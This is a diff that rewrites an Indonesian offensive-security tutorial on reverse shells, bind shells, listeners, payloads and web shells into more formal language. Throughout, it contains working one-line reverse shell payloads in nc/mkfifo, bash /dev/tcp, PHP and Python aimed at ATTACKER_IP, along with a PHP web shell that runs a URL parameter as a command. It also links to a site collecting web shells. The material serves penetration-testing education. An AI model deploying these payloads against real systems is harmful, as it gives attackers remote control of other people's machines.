@@ -6,7 +6,7 @@
 
 ## Shellls Introduction
 
-Shells dalam cybersecurity sering sekali dipakai oleh attackers buat ngontrol sistem dari jarak jauh (remote), yang membuat mereka jadi bagian penting dari rantai serangan (attack chain)., kita bakal eksplor berbagai jenis shells yang dipake dalam offensive security, bedanya apa saja, dan kapan pakainya. Pengetahuan ini bisa ngebantu ningkatin skill penetration testing dan exploitation, dan juga ngebantu kita paham gimana cara mendeteksi kalau ada remote shell yang lagi dipake attacker di dalam organisasi.
+Shells dalam cybersecurity sering sekali dipakai oleh attackers untuk mengontrol sistem dari jarak jauh (remote), yang membuat mereka jadi bagian penting dari rantai serangan (attack chain)., kita bakal eksplor berbagai jenis shells yang digunakan dalam offensive security, bedanya apa saja, dan kapan menggunakannya. Pengetahuan ini bisa membantu meningkatkan skill penetration testing dan exploitation, dan juga membantu kita paham bagaimana cara mendeteksi kalau ada remote shell yang sedang digunakan attacker di dalam organisasi.
 
 ### Learning Objectives
 
@@ -43,7 +43,7 @@ Reverse shell, atau kadang disebut **"connect back shell"**, adalah teknik palin
 
 Bedanya sama shell biasa, di sini **koneksi dimulai dari sistem target ke mesin attacker**.
 
-Kenapa gini? Agar bisa ngehindarin deteksi firewall. Biasanya firewall ngeblok koneksi masuk (ingress) sembarangan, tapi ngebolehin koneksi keluar (egress). Jadi kalau target yang connect duluan ke kita, firewall seringkali bakal ngebolehin dan kita dapet shell.
+Kenapa begini? Agar bisa menghindari deteksi firewall. Biasanya firewall memblokir koneksi masuk (ingress) sembarangan, tapi membolehkan koneksi keluar (egress). Jadi kalau target yang connect duluan ke kita, firewall seringkali akan membolehkan dan kita mendapatkan shell.
 
 ### How Reverse Shells Work
 
@@ -70,9 +70,9 @@ Sebenernya port berapa saja bisa (53, 80, 8080, 139, 445), tapi attacker sering 
 
 ### Gaining Reverse Shell Access
 
-Setelah listener siap, langkah selanjutnya adalah attacker harus ngejalanin **payload reverse shell** di mesin target.
+Setelah listener siap, langkah selanjutnya adalah attacker harus menjalankan **payload reverse shell** di mesin target.
 
-Payload ini biasanya manfaatin celah keamanan (vulnerability) atau akses ilegal yang sudah didapet sebelumnya buat ngejalanin perintah yang bakal ngebuka shell aka akses sistem lewat jaringan.
+Payload ini biasanya memanfaatkan celah keamanan (vulnerability) atau akses ilegal yang sudah didapat sebelumnya untuk menjalankan perintah yang akan membuka shell aka akses sistem lewat jaringan.
 
 Ada banyak jenis payload tergantung OS dan tools yang ada. Salah satu contoh klasik yang sering dipake adalah **Pipe Reverse Shell**.
 
@@ -88,13 +88,13 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_P
 - `mkfifo /tmp/f`: Membuat **Named Pipe** (FIFO - First In First Out) di `/tmp/f`. Pipe ini fungsinya seperti saluran komunikasi dua arah.
 - `cat /tmp/f`: Baca data dari pipe itu dan nunggu input masuk.
 - `| sh -i 2>&1`: Output dari `cat` (input kita) dioper ke shell (`sh`) secara interaktif (`-i`). `2>&1` artinya redirect error message ke standard output, jadi kita bisa melihat kalau ada error.
-- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: Output dari shell (hasil perintah yang dijalankan) dikirim balik ke attacker lewat Netcat. Tanda `>/tmp/f` ngebalikin lagi outputnya ke pipe awal, agar jadi _loop_ komunikasi dua arah yang jalan terus.
+- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: Output dari shell (hasil perintah yang dijalankan) dikirim balik ke attacker lewat Netcat. Tanda `>/tmp/f` mengembalikan lagi outputnya ke pipe awal, agar jadi _loop_ komunikasi dua arah yang jalan terus.
 
-Intinya, payload ini ngebuka shell `bash` atau `sh` dan "membuang" input/output-nya ke Netcat listener kita.
+Intinya, payload ini membuka shell `bash` atau `sh` dan "membuang" input/output-nya ke Netcat listener kita.
 
 ### Attacker Receives the Shell
 
-Begitu payload dijalankan di target, listener di mesin attacker bakal nangkep koneksinya dan Kita dapet akses shell.
+Begitu payload dijalankan di target, listener di mesin attacker akan menangkap koneksinya dan Kita mendapatkan akses shell.
 
 Contoh output di terminal attacker bakal seperti gini:
 
@@ -173,7 +173,7 @@ nc -nv TARGET_IP 8080
 **Penjelasan Command:**
 
 - `nc`: Panggil Netcat.
-- `-n`: **No DNS**, agar cepat dan tidak berisik ngelakuin DNS lookup.
+- `-n`: **No DNS**, agar cepat dan tidak berisik melakukan DNS lookup.
 - `-v`: **Verbose**, agar kita tau pas koneksinya berhasil ("open").
 - `TARGET_IP`: IP address mesin target yang sudah kita pasangin bind shell.
 - `8080`: Port yang lagi dibuka sama bind shell di target.
@@ -190,7 +190,7 @@ Pas koneksi berhasil (`open`), kita langsung dapet shell Coba ketik perintah sep
 
 ## Shells Listener
 
-Seperti yang sudah kita pelajari, reverse shell bakal connect dari target ke mesin attacker. Biasanya kita pakai Netcat buat nangkep koneksinya, tapi Netcat bukan satu-satunya tools yang bisa dipake.
+Seperti yang sudah kita pelajari, reverse shell akan connect dari target ke mesin attacker. Biasanya kita pakai Netcat untuk menangkap koneksinya, tapi Netcat bukan satu-satunya tools yang bisa digunakan.
 
 kita eksplor tools lain yang bisa jadi listener buat capture shell.
 
@@ -255,7 +255,7 @@ Socat syntax nya agak beda dan lebih kompleks, tapi fiturnya jauh lebih canggih 
 
 ## Shells Payloads
 
-Shell Payload itu command atau script yang kita jalanin di target buat ngebuka akses shell. Bisa buat reverse shell (mengirim koneksi) atau bind shell (nunggu koneksi).
+Shell Payload itu command atau script yang kita jalankan di target untuk membuka akses shell. Bisa untuk reverse shell (mengirim koneksi) atau bind shell (menunggu koneksi).
 
 Kita bakal bahas beberapa payload populer di Linux.
 
@@ -275,7 +275,7 @@ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
 
 - `bash -i`: Jalanin shell Bash secara **interaktif**.
 - `>&`: Redirect output (stdout) dan error (stderr) ke alamat yang sama.
-- `/dev/tcp/ATTACKER_IP/443`: Ini fitur unik Bash. Dia ngebuka koneksi TCP ke `ATTACKER_IP` di port `443`.
+- `/dev/tcp/ATTACKER_IP/443`: Ini fitur unik Bash. Dia membuka koneksi TCP ke `ATTACKER_IP` di port `443`.
 - `0>&1`: Redirect input (stdin) ke stdout (yang sudah tersambung ke koneksi TCP tadi).
 
 Intinya, command ini membuat input dan output shell Bash kita "nyambung" langsung ke komputer attacker lewat jaringan.
@@ -303,7 +303,7 @@ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; 
 ```
 
 **Penjelasan:**
-Sama seperti yang di atas, tapi pakai nomor file descriptor acak (196) buat ngehindarin konflik atau deteksi simpel. Dia nge-spawn shell `sh` yang input/output-nya diredirect ke koneksi TCP (fd 196).
+Sama seperti yang di atas, tapi pakai nomor file descriptor acak (196) untuk menghindari konflik atau deteksi simpel. Dia meng-spawn shell `sh` yang input/output-nya diredirect ke koneksi TCP (fd 196).
 
 **3. Bash With File Descriptor 5 (Short Version)**
 
@@ -352,7 +352,7 @@ Sama persis seperti `exec`, cuma beda fungsi pemanggilnya saja.
 php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
 ```
 
-Fungsi `system` ini bakal ngejalanin command dan langsung menampilkan hasilnya (output) ke browser atau terminal.
+Fungsi `system` ini akan menjalankan command dan langsung menampilkan hasilnya (output) ke browser atau terminal.
 
 **3. PHP Using `passthru`**
 
@@ -368,7 +368,7 @@ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
 php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
 ```
 
-`popen` ngebuka process file pointer. Jadi dia ngebuka koneksi seperti file biasa, tapi isinya command yang mau dijalankan.
+`popen` membuka process file pointer. Jadi dia membuka koneksi seperti file biasa, tapi isinya command yang mau dijalankan.
 
 ### Python
 
@@ -394,7 +394,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 **Penjelasan Payload:**
 
-- `subprocess.call`: Kita pakai modul `subprocess` buat ngejalanin shell `/bin/sh`.
+- `subprocess.call`: Kita pakai modul `subprocess` untuk menjalankan shell `/bin/sh`.
 - `os.dup2`: Redirect stdin, stdout, stderr ke socket.
 
 **3. Short Python Reverse Shell**
@@ -472,7 +472,7 @@ if (isset($_GET['cmd'])) {
 **Penjelasan Code:**
 
 - `$_GET['cmd']`: Script ini bakal nunggu input parameter bernama `cmd` dari URL (method GET).
-- `system(...)`: Fungsi ini bakal ngejalanin apapun isi dari `cmd` sebagai perintah sistem.
+- `system(...)`: Fungsi ini akan menjalankan apapun isi dari `cmd` sebagai perintah sistem.
 
 **Cara Pakainya:**
 Kalau script ini disimpan dengan nama `shell.php` di web server, attacker tinggal buka URL seperti gini:
@@ -502,4 +502,4 @@ Kekuatan bahasa pemrograman yang didukung oleh web server memungkinkan web shell
 <img src="../../Assets/Images/c99shell.png" alt="c99 shell">
 </p>
 
-Kamu bisa nemuin lebih banyak web shells di: [r57shell.net](https://www.r57shell.net/index.php).
+Kamu bisa menemukan lebih banyak web shells di: [r57shell.net](https://www.r57shell.net/index.php).
